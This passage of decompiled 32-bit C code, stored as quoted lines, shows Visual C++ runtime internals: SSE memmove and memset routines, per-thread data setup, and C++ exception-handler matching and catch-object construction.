    "          v10 = _mm_load_si128(v9 + 1);",
    "          v4 -= 48;",
    "          v11 = _mm_load_si128(v9 + 2);",
    "          v12 = _mm_load_si128(v9 + 3);",
    "          v9 += 3;",
    "          *v5 = _mm_alignr_epi8(v10, v8, 12);",
    "          v5[1] = _mm_alignr_epi8(v11, v10, 12);",
    "          v8 = v12;",
    "          v5[2] = _mm_alignr_epi8(v12, v11, 12);",
    "          v5 += 3;",
    "        }",
    "        while ( v4 >= 0x30 );",
    "        v13 = (const __m128i *)((char *)&v9->m128i_u64[1] + 4);",
    "      }",
    "      else",
    "      {",
    "        v19 = _mm_load_si128((const __m128i *)((char *)v3 - 4));",
    "        v20 = (const __m128i *)((char *)v3 - 4);",
    "        do",
    "        {",
    "          v21 = _mm_load_si128(v20 + 1);",
    "          v4 -= 48;",
    "          v22 = _mm_load_si128(v20 + 2);",
    "          v23 = _mm_load_si128(v20 + 3);",
    "          v20 += 3;",
    "          *v5 = _mm_alignr_epi8(v21, v19, 4);",
    "          v5[1] = _mm_alignr_epi8(v22, v21, 4);",
    "          v19 = v23;",
    "          v5[2] = _mm_alignr_epi8(v23, v22, 4);",
    "          v5 += 3;",
    "        }",
    "        while ( v4 >= 0x30 );",
    "        v13 = (const __m128i *)((char *)v20->m128i_i64 + 4);",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v14 = _mm_load_si128((const __m128i *)((char *)v3 - 8));",
    "      v15 = (const __m128i *)((char *)v3 - 8);",
    "      do",
    "      {",
    "        v16 = _mm_load_si128(v15 + 1);",
    "        v4 -= 48;",
    "        v17 = _mm_load_si128(v15 + 2);",
    "        v18 = _mm_load_si128(v15 + 3);",
    "        v15 += 3;",
    "        *v5 = _mm_alignr_epi8(v16, v14, 8);",
    "        v5[1] = _mm_alignr_epi8(v17, v16, 8);",
    "        v14 = v18;",
    "        v5[2] = _mm_alignr_epi8(v18, v17, 8);",
    "        v5 += 3;",
    "      }",
    "      while ( v4 >= 0x30 );",
    "      v13 = (const __m128i *)&v15->m128i_u64[1];",
    "    }",
    "    while ( v4 >= 0x10 )",
    "    {",
    "LABEL_30:",
    "      v24 = _mm_loadu_si128(v13);",
    "      v4 -= 16;",
    "      ++v13;",
    "      *v5++ = v24;",
    "    }",
    "    if ( (v4 & 4) != 0 )",
    "    {",
    "      v25 = v13->m128i_i32[0];",
    "      v4 -= 4;",
    "      v13 = (const __m128i *)((char *)v13 + 4);",
    "      v5->m128i_i32[0] = v25;",
    "      v5 = (__m128i *)((char *)v5 + 4);",
    "    }",
    "    if ( (v4 & 8) != 0 )",
    "    {",
    "      v26 = v13->m128i_i64[0];",
    "      v4 -= 8;",
    "      v13 = (const __m128i *)((char *)v13 + 8);",
    "      v5->m128i_i64[0] = v26;",
    "      v5 = (__m128i *)((char *)v5 + 8);",
    "    }",
    "    switch ( v4 )",
    "    {",
    "      case 0u:",
    "TrailingUp0:",
    "        result = a1;",
    "        break;",
    "      case 1u:",
    "TrailingUp1:",
    "        v5->m128i_i8[0] = v13->m128i_i8[0];",
    "        result = a1;",
    "        break;",
    "      case 2u:",
    "TrailingUp2:",
    "        v5->m128i_i8[0] = v13->m128i_i8[0];",
    "        v5->m128i_i8[1] = v13->m128i_i8[1];",
    "        result = a1;",
    "        break;",
    "      case 3u:",
    "TrailingUp3:",
    "        v5->m128i_i8[0] = v13->m128i_i8[0];",
    "        v5->m128i_i8[1] = v13->m128i_i8[1];",
    "        v5->m128i_i8[2] = v13->m128i_i8[2];",
    "        result = a1;",
    "        break;",
    "      default:",
    "        goto LABEL_30;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__vcrt_bool __cdecl __vcrt_initialize()",
    "{",
    "  if ( !(unsigned __int8)__vcrt_initialize_locks() )",
    "    return 0;",
    "  if ( !(unsigned __int8)__vcrt_initialize_ptd() )",
    "  {",
    "    __vcrt_uninitialize_locks();",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "__vcrt_bool __cdecl __vcrt_thread_attach()",
    "{",
    "  return __vcrt_getptd_noexit() != 0;",
    "}",
    "",
    "",
    "__vcrt_bool __cdecl __vcrt_thread_detach()",
    "{",
    "  __vcrt_freeptd_for_this_thread();",
    "  return 1;",
    "}",
    "",
    "",
    "__vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating)",
    "{",
    "  if ( !Terminating )",
    "  {",
    "    __vcrt_uninitialize_ptd();",
    "    __vcrt_uninitialize_locks();",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "__vcrt_bool __cdecl __vcrt_uninitialize_critical()",
    "{",
    "  __vcrt_uninitialize_ptd();",
    "  return 1;",
    "}",
    "",
    "",
    "void *__cdecl memset(void *a1, int Val, size_t Size)",
    "{",
    "  size_t v3; // ecx",
    "  __m128i *v4; // edi",
    "  unsigned int v5; // eax",
    "  __m128i v7; // xmm0",
    "  __m128i *v8; // edi",
    "",
    "  v3 = Size;",
    "  v4 = (__m128i *)a1;",
    "  if ( !Size )",
    "    return a1;",
    "  v5 = 16843009 * (unsigned __int8)Val;",
    "  if ( Size <= 0x20 )",
    "    goto SmallMov;",
    "  if ( Size >= 0x80 )",
    "  {",
    "    if ( _bittest(&dword_10040150, 1u) )",
    "    {",
    "      memset(a1, Val, Size);",
    "      return a1;",
    "    }",
    "    if ( !_bittest(dword_1003F090, 1u) )",
    "      goto SmallMov;",
    "    v7 = _mm_shuffle_epi32(_mm_cvtsi32_si128(v5), 0);",
    "    *(__m128i *)a1 = v7;",
    "    v4 = (__m128i *)(((unsigned int)a1 + 16) & 0xFFFFFFF0);",
    "    v3 = (_BYTE *)a1 + Size - (_BYTE *)v4;",
    "    if ( v3 > 0x80 )",
    "    {",
    "      do",
    "      {",
    "        *v4 = v7;",
    "        v4[1] = v7;",
    "        v4[2] = v7;",
    "        v4[3] = v7;",
    "        v4[4] = v7;",
    "        v4[5] = v7;",
    "        v4[6] = v7;",
    "        v4[7] = v7;",
    "        v4 += 8;",
    "        v3 -= 128;",
    "      }",
    "      while ( (v3 & 0xFFFFFF00) != 0 );",
    "      goto XmmSmallLoop;",
    "    }",
    "  }",
    "  if ( !_bittest(dword_1003F090, 1u) )",
    "  {",
    "SmallMov:",
    "    while ( (v3 & 3) != 0 )",
    "    {",
    "      v4->m128i_i8[0] = Val;",
    "      v4 = (__m128i *)((char *)v4 + 1);",
    "      --v3;",
    "    }",
    "    if ( (v3 & 4) != 0 )",
    "    {",
    "      v4->m128i_i32[0] = v5;",
    "      v4 = (__m128i *)((char *)v4 + 4);",
    "      v3 -= 4;",
    "    }",
    "    for ( ; (v3 & 0xFFFFFFF8) != 0; v3 -= 8 )",
    "    {",
    "      v4->m128i_i32[0] = v5;",
    "      v4->m128i_i32[1] = v5;",
    "      v4 = (__m128i *)((char *)v4 + 8);",
    "    }",
    "    return a1;",
    "  }",
    "  v7 = _mm_shuffle_epi32(_mm_cvtsi32_si128(v5), 0);",
    "XmmSmallLoop:",
    "  if ( v3 < 0x20 )",
    "    goto XMMTrailingBytes;",
    "  do",
    "  {",
    "    *v4 = v7;",
    "    v4[1] = v7;",
    "    v4 += 2;",
    "    v3 -= 32;",
    "  }",
    "  while ( v3 >= 0x20 );",
    "  if ( (v3 & 0x1F) != 0 )",
    "  {",
    "XMMTrailingBytes:",
    "    v8 = (__m128i *)((char *)v4 + v3 - 32);",
    "    *v8 = v7;",
    "    v8[1] = v7;",
    "    return a1;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "int __cdecl __std_type_info_compare(int a1, int a2)",
    "{",
    "  _BYTE *v3; // ecx",
    "  _BYTE *i; // eax",
    "  bool v5; // cf",
    "  unsigned __int8 v6; // dl",
    "",
    "  if ( a1 == a2 )",
    "    return 0;",
    "  v3 = (_BYTE *)(a2 + 5);",
    "  for ( i = (_BYTE *)(a1 + 5); ; i += 2 )",
    "  {",
    "    v5 = *i < *v3;",
    "    if ( *i != *v3 )",
    "      break;",
    "    if ( !*i )",
    "      return 0;",
    "    v6 = i[1];",
    "    v5 = v6 < v3[1];",
    "    if ( v6 != v3[1] )",
    "      break;",
    "    v3 += 2;",
    "    if ( !v6 )",
    "      return 0;",
    "  }",
    "  return v5 ? -1 : 1;",
    "}",
    "",
    "",
    "PSLIST_ENTRY __cdecl __std_type_info_destroy_list(PSLIST_HEADER ListHead)",
    "{",
    "  PSLIST_ENTRY result; // eax",
    "  PSLIST_ENTRY Next; // esi",
    "",
    "  result = InterlockedFlushSList(ListHead);",
    "  if ( result )",
    "  {",
    "    do",
    "    {",
    "      Next = result->Next;",
    "      j___free_base(result);",
    "      result = Next;",
    "    }",
    "    while ( Next );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __stdcall __vcrt_freefls(void *Block)",
    "{",
    "  if ( Block )",
    "  {",
    "    if ( Block != &unk_1004016C )",
    "      j___free_base(Block);",
    "  }",
    "}",
    "",
    "",
    "void __vcrt_freeptd_for_this_thread()",
    "{",
    "  void *Value; // esi",
    "",
    "  if ( dwTlsIndex != -1 )",
    "  {",
    "    Value = (void *)__vcrt_FlsGetValue(dwTlsIndex);",
    "    __vcrt_FlsSetValue(dwTlsIndex, 0);",
    "    __vcrt_freefls(Value);",
    "  }",
    "}",
    "",
    "",
    "int __vcrt_getptd()",
    "{",
    "  int result; // eax",
    "",
    "  result = __vcrt_getptd_noexit();",
    "  if ( !result )",
    "    abort();",
    "  return result;",
    "}",
    "",
    "",
    "int __vcrt_getptd_noexit()",
    "{",
    "  DWORD LastError; // edi",
    "  int Value; // eax",
    "  int v3; // ebx",
    "  void *v4; // eax",
    "  void *v5; // esi",
    "",
    "  if ( dwTlsIndex == -1 )",
    "    return 0;",
    "  LastError = GetLastError();",
    "  Value = __vcrt_FlsGetValue(dwTlsIndex);",
    "  v3 = Value;",
    "  if ( Value == -1 )",
    "  {",
    "LABEL_6:",
    "    v3 = 0;",
    "    goto LABEL_12;",
    "  }",
    "  if ( !Value )",
    "  {",
    "    if ( __vcrt_FlsSetValue(dwTlsIndex, (LPVOID)0xFFFFFFFF) )",
    "    {",
    "      v4 = (void *)sub_1001E950(1, 40);",
    "      v5 = v4;",
    "      if ( v4 && __vcrt_FlsSetValue(dwTlsIndex, v4) )",
    "      {",
    "        v3 = (int)v5;",
    "        v5 = 0;",
    "      }",
    "      else",
    "      {",
    "        v3 = 0;",
    "        __vcrt_FlsSetValue(dwTlsIndex, 0);",
    "      }",
    "      j___free_base(v5);",
    "      goto LABEL_12;",
    "    }",
    "    goto LABEL_6;",
    "  }",
    "LABEL_12:",
    "  SetLastError(LastError);",
    "  return v3;",
    "}",
    "",
    "",
    "char __vcrt_initialize_ptd()",
    "{",
    "  DWORD v0; // eax",
    "",
    "  v0 = __vcrt_FlsAlloc(__vcrt_freefls);",
    "  dwTlsIndex = v0;",
    "  if ( v0 == -1 )",
    "    return 0;",
    "  if ( !__vcrt_FlsSetValue(v0, &unk_1004016C) )",
    "  {",
    "    __vcrt_uninitialize_ptd();",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __vcrt_uninitialize_ptd()",
    "{",
    "  if ( dwTlsIndex != -1 )",
    "  {",
    "    __vcrt_FlsFree(dwTlsIndex);",
    "    dwTlsIndex = -1;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "int __cdecl BuildCatchObjectHelperInternal<__FrameHandler3>(int a1, int *a2, int *a3, int a4)",
    "{",
    "  int v4; // ebx",
    "  int v5; // ecx",
    "  int v6; // edx",
    "  int v7; // ecx",
    "  int *v8; // esi",
    "  int v9; // ecx",
    "  int v10; // eax",
    "  int v11; // ecx",
    "  const void *v12; // eax",
    "  size_t v14; // [esp-4h] [ebp-34h]",
    "",
    "  v4 = 0;",
    "  v5 = a3[1];",
    "  if ( v5 )",
    "  {",
    "    if ( *(_BYTE *)(v5 + 8) )",
    "    {",
    "      v6 = a3[2];",
    "      if ( v6 || *a3 < 0 )",
    "      {",
    "        v7 = *a3;",
    "        v8 = a2;",
    "        if ( *a3 >= 0 )",
    "          v8 = (int *)((char *)a2 + v6 + 12);",
    "        if ( (v7 & 0x80u) != 0 && (*(_BYTE *)a4 & 0x10) != 0 && dword_10040168 )",
    "        {",
    "          v9 = ((int (__thiscall *)(int))dword_10040168)(dword_10040168);",
    "        }",
    "        else",
    "        {",
    "          if ( (v7 & 8) == 0 )",
    "          {",
    "            if ( (*(_BYTE *)a4 & 1) != 0 )",
    "            {",
    "              if ( *(_DWORD *)(a1 + 24) && v8 )",
    "              {",
    "                memmove(v8, *(const void **)(a1 + 24), *(_DWORD *)(a4 + 20));",
    "                if ( *(_DWORD *)(a4 + 20) != 4 || !*v8 )",
    "                  return v4;",
    "                v10 = __AdjustPointer(*v8, (_DWORD *)(a4 + 8));",
    "                goto LABEL_22;",
    "              }",
    "            }",
    "            else",
    "            {",
    "              v11 = *(_DWORD *)(a1 + 24);",
    "              if ( *(_DWORD *)(a4 + 24) )",
    "              {",
    "                if ( v11 && v8 )",
    "                  return ((*(_BYTE *)a4 & 4) != 0) + 1;",
    "              }",
    "              else if ( v11 && v8 )",
    "              {",
    "                v14 = *(_DWORD *)(a4 + 20);",
    "                v12 = (const void *)__AdjustPointer(v11, (_DWORD *)(a4 + 8));",
    "                memmove(v8, v12, v14);",
    "                return v4;",
    "              }",
    "            }",
    "LABEL_33:",
    "            abort();",
    "          }",
    "          v9 = *(_DWORD *)(a1 + 24);",
    "        }",
    "        if ( v9 && v8 )",
    "        {",
    "          *v8 = v9;",
    "          v10 = __AdjustPointer(v9, (_DWORD *)(a4 + 8));",
    "LABEL_22:",
    "          *v8 = v10;",
    "          return v4;",
    "        }",
    "        goto LABEL_33;",
    "      }",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "void __cdecl BuildCatchObjectInternal<__FrameHandler3>(int a1, int *a2, int *a3, int a4)",
    "{",
    "  int *v4; // edi",
    "  int v5; // eax",
    "  void *v6; // eax",
    "  void *v7; // eax",
    "",
    "  if ( *a3 >= 0 )",
    "    v4 = (int *)((char *)a2 + a3[2] + 12);",
    "  else",
    "    v4 = a2;",
    "  v5 = BuildCatchObjectHelperInternal<__FrameHandler3>(a1, a2, a3, a4) - 1;",
    "  if ( v5 )",
    "  {",
    "    if ( v5 == 1 )",
    "    {",
    "      v6 = (void *)__AdjustPointer(*(_DWORD *)(a1 + 24), (_DWORD *)(a4 + 8));",
    "      _CallMemberFunction2(v4, *(void *const *)(a4 + 24), v6, 1);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v7 = (void *)__AdjustPointer(*(_DWORD *)(a1 + 24), (_DWORD *)(a4 + 8));",
    "    _CallMemberFunction1(v4, *(void *const *)(a4 + 24), v7);",
    "  }",
    "}",
    "",
    "",
    "void __cdecl CatchIt<__FrameHandler3>(",
    "        PEXCEPTION_RECORD ExceptionRecord,",
    "        struct EHRegistrationNode *a2,",
    "        int a3,",
    "        void *a4,",
    "        struct _s_FuncInfo *a5,",
    "        int a6,",
    "        int a7,",
    "        int *a8,",
    "        int a9,",
    "        struct EHRegistrationNode *TargetFrame)",
    "{",
    "  struct EHRegistrationNode *v10; // eax",
    "  void (__stdcall *v11)(void *, struct EHRegistrationNode *); // eax",
    "",
    "  if ( a7 )",
    "    BuildCatchObjectInternal<__FrameHandler3>((int)ExceptionRecord, (int *)a2, (int *)a6, a7);",
    "  v10 = TargetFrame;",
    "  if ( !TargetFrame )",
    "    v10 = a2;",
    "  sub_10016951((struct _EXCEPTION_REGISTRATION_RECORD **)a6, v10, ExceptionRecord);",
    "  __FrameHandler3::FrameUnwindToState(a2, a4, a5, *a8);",
    "  __FrameHandler3::SetState(a2, a5, a8[1] + 1);",
    "  v11 = (void (__stdcall *)(void *, struct EHRegistrationNode *))sub_100183AB(",
    "                                                                   (int)ExceptionRecord,",
    "                                                                   a2,",
    "                                                                   a3,",
    "                                                                   a5,",
    "                                                                   *(void **)(a6 + 12),",
    "                                                                   a9,",
    "                                                                   0x100u);",
    "  if ( v11 )",
    "    _JumpToContinuation(v11, a2);",
    "}",
    "",
    "",
    "int __cdecl FindHandler<__FrameHandler3>(",
    "        struct EHExceptionRecord *ExceptionRecord,",
    "        struct EHRegistrationNode *a2,",
    "        void *a3,",
    "        void *a4,",
    "        struct _s_FuncInfo *a5,",
    "        char a6,",
    "        int a7,",
    "        struct EHRegistrationNode *TargetFrame)",
    "{",
    "  struct _s_FuncInfo *v8; // edi",
    "  __ehstate_t CurrentState; // eax",
    "  int v10; // ecx",
    "  struct EHExceptionRecord *v11; // ebx",
    "  int v12; // esi",
    "  int result; // eax",
    "  void *v14; // edx",
    "  struct EHRegistrationNode *v15; // esi",
    "  struct _s_ESTypeList *v16; // edx",
    "  int v17; // eax",
    "  int v18; // ecx",
    "  int v19; // ecx",
    "  ThrowInfo *pThrowInfo; // edx",
    "  int *p_nCatchableTypes; // eax",
    "  int v22; // esi",
    "  int *v23; // eax",
    "  int v24; // esi",
    "  int *v25; // edi",
    "  const struct _s_ESTypeList *ESTypes; // eax",
    "  struct _s_ESTypeList *v27; // [esp-4h] [ebp-74h]",
    "  int v28[5]; // [esp+Ch] [ebp-64h] BYREF",
    "  int v29[4]; // [esp+20h] [ebp-50h] BYREF",
    "  int v30; // [esp+30h] [ebp-40h] BYREF",
    "  _DWORD pExceptionObject[2]; // [esp+34h] [ebp-3Ch] BYREF",
    "  unsigned int v32; // [esp+3Ch] [ebp-34h]",
    "  _DWORD v33[2]; // [esp+40h] [ebp-30h] BYREF",
    "  int v34; // [esp+48h] [ebp-28h]",
    "  int v35; // [esp+4Ch] [ebp-24h]",
    "  int *v36; // [esp+50h] [ebp-20h]",
    "  int v37; // [esp+54h] [ebp-1Ch]",
    "  int v38; // [esp+58h] [ebp-18h]",
    "  int v39; // [esp+5Ch] [ebp-14h]",
    "  int v40; // [esp+60h] [ebp-10h]",
    "  struct _s_ESTypeList *v41; // [esp+64h] [ebp-Ch]",
    "  int v42; // [esp+68h] [ebp-8h]",
    "  int v43; // [esp+6Ch] [ebp-4h]",
    "",
    "  v8 = a5;",
    "  v40 = 0;",
    "  LOBYTE(v38) = 0;",
    "  CurrentState = __FrameHandler3::GetCurrentState(a2, a4, a5);",
    "  v10 = CurrentState;",
    "  v42 = CurrentState;",
    "  if ( CurrentState < -1 || CurrentState >= a5->maxState )",
    "    goto LABEL_68;",
    "  v11 = ExceptionRecord;",
    "  if ( ExceptionRecord->ExceptionCode == -529697949",
    "    && ExceptionRecord->NumberParameters == 3",
    "    && (ExceptionRecord->params.magicNumber == 429065504",
    "     || ExceptionRecord->params.magicNumber == 429065505",
    "     || ExceptionRecord->params.magicNumber == 429065506)",
    "    && (v12 = 0, !ExceptionRecord->params.pThrowInfo) )",
    "  {",
    "    result = __vcrt_getptd();",
    "    if ( !*(_DWORD *)(result + 16) )",
    "      return result;",
    "    v11 = *(struct EHExceptionRecord **)(__vcrt_getptd() + 16);",
    "    LOBYTE(v38) = 1;",
    "    v43 = *(_DWORD *)(__vcrt_getptd() + 20);",
    "    if ( !v11",
    "      || v11->ExceptionCode == -529697949",
    "      && v11->NumberParameters == 3",
    "      && (v11->params.magicNumber == 429065504",
    "       || v11->params.magicNumber == 429065505",
    "       || v11->params.magicNumber == 429065506)",
    "      && !v11->params.pThrowInfo )",
    "    {",
    "      goto LABEL_68;",
    "    }",
    "    if ( *(_DWORD *)(__vcrt_getptd() + 28) )",
    "    {",
    "      v41 = *(struct _s_ESTypeList **)(__vcrt_getptd() + 28);",
    "      v27 = v41;",
    "      *(_DWORD *)(__vcrt_getptd() + 28) = 0;",
    "      if ( !IsInExceptionSpec(v11, v27) )",
    "      {",
    "        if ( v41->nCount > 0 )",
    "        {",
    "          do",
    "          {",
    "            if ( (unsigned __int8)type_info::operator==(&std::bad_exception `RTTI Type Descriptor') )",
    "            {",
    "              __DestructExceptionObject((int)v11);",
    "              sub_10018374(pExceptionObject);",
    "              _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_exception_std__);",
    "            }",
    "            v12 += 16;",
    "            ++v40;",
    "          }",
    "          while ( v40 < v41->nCount );",
    "        }",
    "LABEL_63:",
    "        terminate();",
    "      }",
    "    }",
    "    v14 = (void *)v43;",
    "    v10 = v42;",
    "  }",
    "  else",
    "  {",
    "    v14 = a3;",
    "    v43 = (int)a3;",
    "  }",
    "  v33[0] = a5;",
    "  v33[1] = 0;",
    "  if ( v11->ExceptionCode == -529697949",
    "    && v11->NumberParameters == 3",
    "    && (v11->params.magicNumber == 429065504",
    "     || v11->params.magicNumber == 429065505",
    "     || v11->params.magicNumber == 429065506) )",
    "  {",
    "    v15 = TargetFrame;",
    "    if ( a5->nTryBlocks )",
    "    {",
    "      __FrameHandler3::GetRangeOfTrysToCheck(&v30, (int)v33, v10, (int)a4, (int)a5, a7);",
    "      v16 = (struct _s_ESTypeList *)pExceptionObject[0];",
    "      v17 = v30;",
    "      v34 = v30;",
    "      v41 = (struct _s_ESTypeList *)pExceptionObject[0];",
    "      if ( pExceptionObject[0] < v32 )",
    "      {",
    "        v18 = 20 * pExceptionObject[0];",
    "        v37 = 20 * pExceptionObject[0];",
    "        do",
    "        {",
    "          qmemcpy(v28, (const void *)(v18 + *(_DWORD *)(*(_DWORD *)v17 + 16)), sizeof(v28));",
    "          if ( v28[0] <= v42 && v42 <= v28[1] )",
    "          {",
    "            v19 = 0;",
    "            v40 = 0;",
    "            if ( v28[3] )",
    "            {",
    "              pThrowInfo = v11->params.pThrowInfo;",
    "              p_nCatchableTypes = &pThrowInfo->pCatchableTypeArray->nCatchableTypes;",
    "              v22 = *p_nCatchableTypes;",
    "              v36 = p_nCatchableTypes + 1;",
    "              v23 = (int *)v28[4];",
    "              v35 = v22;",
    "              v39 = v28[4];",
    "              while ( 1 )",
    "              {",
    "                v29[0] = *v23;",
    "                v29[1] = v23[1];",
    "                v29[2] = v23[2];",
    "                v29[3] = v23[3];",
    "                v24 = v35;",
    "                v25 = v36;",
    "                if ( v35 > 0 )",
    "                  break;",
    "LABEL_41:",
    "                ++v19;",
    "                v23 += 4;",
    "                v40 = v19;",
    "                v39 = (int)v23;",
    "                if ( v19 == v28[3] )",
    "                  goto LABEL_44;",
    "              }",
    "              while ( !TypeMatchHelper<__FrameHandler3>(v29, *v25, pThrowInfo) )",
    "              {",
    "                pThrowInfo = v11->params.pThrowInfo;",
    "                --v24;",
    "                ++v25;",
    "                if ( v24 <= 0 )",
    "                {",
    "                  v19 = v40;",
    "                  v23 = (int *)v39;",
    "                  goto LABEL_41;",
    "                }",
    "              }",
    "              CatchIt<__FrameHandler3>((PEXCEPTION_RECORD)v11, a2, v43, a4, a5, (int)v29, *v25, v28, a7, TargetFrame);",
    "LABEL_44:",
    "              v16 = v41;",
    "            }",
    "          }",
    "          v16 = (struct _s_ESTypeList *)((char *)v16 + 1);",
    "          v17 = v34;",
    "          v18 = v37 + 20;",
    "          v41 = v16;",
    "          v37 += 20;",
    "        }",
    "        while ( (unsigned int)v16 < v32 );",
    "        v8 = a5;",
    "        v15 = TargetFrame;",
    "      }",
    "    }",
    "    if ( a6 )",
    "      __DestructExceptionObject((int)v11);",
    "    if ( (*(_DWORD *)v8 & 0x1FFFFFFFu) >= 0x19930521 )",
    "    {",
    "      if ( v8->pESTypeList )",
    "      {",
    "        if ( (v8->EHFlags & 4) != 0 )",
    "        {",
    "LABEL_55:",
    "          *(_DWORD *)(__vcrt_getptd() + 16) = v11;",
    "          *(_DWORD *)(__vcrt_getptd() + 20) = v43;",
    "          goto LABEL_63;",
    "        }",
    "        if ( !IsInExceptionSpec(v11, v8->pESTypeList) )",
    "        {",
    "          *(_DWORD *)(__vcrt_getptd() + 16) = v11;",
    "          *(_DWORD *)(__vcrt_getptd() + 20) = v43;",
    "          if ( !v15 )",
    "            v15 = a2;",
    "          sub_10016951((struct _EXCEPTION_REGISTRATION_RECORD **)v11, v15, (PEXCEPTION_RECORD)v11);",
    "          __FrameHandler3::FrameUnwindToEmptyState(a2, a4, v8);",
    "          ESTypes = __FrameHandler3::getESTypes(v8);",
    "          CallUnexpected(ESTypes);",
    "        }",
    "      }",
    "      else if ( (v8->EHFlags & 4) != 0 && !a7 )",
    "      {",
    "        goto LABEL_55;",
    "      }",
    "    }",
    "  }",
    "  else if ( a5->nTryBlocks )",
    "  {",
    "    if ( a6 )",
    "      goto LABEL_68;",
    "    FindHandlerForForeignException<__FrameHandler3>((PEXCEPTION_RECORD)v11, a2, v14, a4, a5, v10, a7, TargetFrame);",
    "  }",
    "  result = __vcrt_getptd();",
    "  if ( *(_DWORD *)(result + 28) )",
    "LABEL_68:",
    "    abort();",
    "  return result;",
    "}",
    "",
    "",
    "void __cdecl FindHandlerForForeignException<__FrameHandler3>(",
    "        PEXCEPTION_RECORD ExceptionRecord,",
    "        struct EHRegistrationNode *a2,",
    "        void *a3,",
    "        void *a4,",
    "        struct _s_FuncInfo *a5,",
    "        int a6,",
    "        int a7,",
    "        struct EHRegistrationNode *TargetFrame)",
    "{",
    "  PVOID v8; // esi",
    "  unsigned int v9; // edx",
    "  int v10; // eax",
    "  int v11; // ecx",
    "  int v12; // eax",
    "  int v13; // ecx",
    "  int v14[5]; // [esp+4h] [ebp-38h] BYREF",
    "  int v15; // [esp+18h] [ebp-24h] BYREF",
    "  unsigned int v16; // [esp+1Ch] [ebp-20h]",
    "  unsigned int v17; // [esp+24h] [ebp-18h]",
    "  _DWORD v18[2]; // [esp+28h] [ebp-14h] BYREF",
    "  int v19; // [esp+30h] [ebp-Ch]",
    "  int v20; // [esp+34h] [ebp-8h]",
    "  unsigned int v21; // [esp+38h] [ebp-4h]",
    "",
    "  if ( ExceptionRecord->ExceptionCode != -2147483645 )",
    "  {",
    "    if ( !*(_DWORD *)(__vcrt_getptd() + 8)",
    "      || (v8 = EncodePointer(0), *(PVOID *)(__vcrt_getptd() + 8) == v8)",
    "      || ExceptionRecord->ExceptionCode == -532459699",
    "      || ExceptionRecord->ExceptionCode == -532462766",
    "      || !_CallSETranslator((struct EHExceptionRecord *)ExceptionRecord, a2, a3, a4, a5, a7, TargetFrame) )",
    "    {",
    "      v18[0] = a5;",
    "      v18[1] = 0;",
    "      if ( !a5->nTryBlocks )",
    "        abort();",
    "      __FrameHandler3::GetRangeOfTrysToCheck(&v15, (int)v18, a6, (int)a4, (int)a5, a7);",
    "      v9 = v16;",
    "      v10 = v15;",
    "      v19 = v15;",
    "      v21 = v16;",
    "      if ( v16 < v17 )",
    "      {",
    "        v11 = 20 * v16;",
    "        v20 = 20 * v16;",
    "        do",
    "        {",
    "          qmemcpy(v14, (const void *)(v11 + *(_DWORD *)(*(_DWORD *)v10 + 16)), sizeof(v14));",
    "          if ( v14[0] <= a6 && a6 <= v14[1] )",
    "          {",
    "            v12 = 16 * v14[3] + v14[4] - 16;",
    "            v13 = *(_DWORD *)(v12 + 4);",
    "            if ( (!v13 || !*(_BYTE *)(v13 + 8)) && (*(_BYTE *)v12 & 0x40) == 0 )",
    "            {",
    "              CatchIt<__FrameHandler3>(",
    "                ExceptionRecord,",
    "                a2,",
    "                (int)a3,",
    "                a4,",
    "                a5,",
    "                16 * v14[3] + v14[4] - 16,",
    "                0,",
    "                v14,",
    "                a7,",
    "                TargetFrame);",
    "              v9 = v21;",
    "            }",
    "          }",
    "          ++v9;",
    "          v10 = v19;",
    "          v11 = v20 + 20;",
    "          v21 = v9;",
    "          v20 += 20;",
    "        }",
    "        while ( v9 < v17 );",
    "      }",
    "    }",
    "  }",
    "}",
    "",
    "",
    "int __cdecl TypeMatchHelper<__FrameHandler3>(int a1, int a2, _BYTE *a3)",
    "{",
    "  int v3; // eax",
    "  int v4; // ebx",
    "  int v5; // esi",
    "  int v6; // eax",
    "",
    "  v3 = *(_DWORD *)(a1 + 4);",
    "  if ( !v3 || !*(_BYTE *)(v3 + 8) || *(char *)a1 < 0 && (*(_BYTE *)a2 & 0x10) != 0 )",
    "    return 1;",
    "  v4 = *(_DWORD *)(a2 + 4);",
    "  v5 = 0;",
    "  if ( v3 != v4 )",
    "  {",
    "    v6 = strcmp((const char *)(v3 + 8), (const char *)(v4 + 8));",
    "    if ( v6 )",
    "      v6 = v6 < 0 ? -1 : 1;",
    "    if ( v6 )",
    "      return 0;",
    "  }",
    "  if ( ((*(_BYTE *)a2 & 2) == 0 || (*(_BYTE *)a1 & 8) != 0)",
    "    && ((*a3 & 1) == 0 || (*(_BYTE *)a1 & 1) != 0)",
    "    && ((*a3 & 2) == 0 || (*(_BYTE *)a1 & 2) != 0) )",
    "  {",
    "    return 1;",
    "  }",
    "  return v5;",
    "}",
    "",
    "",
    "int __cdecl __InternalCxxFrameHandler<__FrameHandler3>(",
    "        struct EHExceptionRecord *ExceptionRecord,",
    "        struct EHRegistrationNode *a2,",
    "        void *a3,",
    "        void *a4,",
    "        struct _s_FuncInfo *a5,",
    "        int a6,",
    "        struct EHRegistrationNode *TargetFrame,",
    "        unsigned __int8 a8)",
    "{",
    "  unsigned int v8; // eax",
    "  int (__cdecl *pForwardCompat)(); // esi",
    "",
    "  __except_validate_context_record(a3);",
    "  if ( *(_DWORD *)(__vcrt_getptd() + 32)",
    "    || ExceptionRecord->ExceptionCode == -529697949",
    "    || ExceptionRecord->ExceptionCode == -2147483610",
    "    || (*(_DWORD *)a5 & 0x1FFFFFFFu) < 0x19930522",
    "    || (a5->EHFlags & 1) == 0 )",
    "  {",
    "    if ( (ExceptionRecord->ExceptionFlags & 0x66) != 0 )",
    "    {",
    "      if ( a5->maxState )",
    "      {",
    "        if ( !a6 )",
    "          __FrameHandler3::FrameUnwindToEmptyState(a2, a4, a5);",
    "      }",
    "    }",
    "    else if ( a5->nTryBlocks",
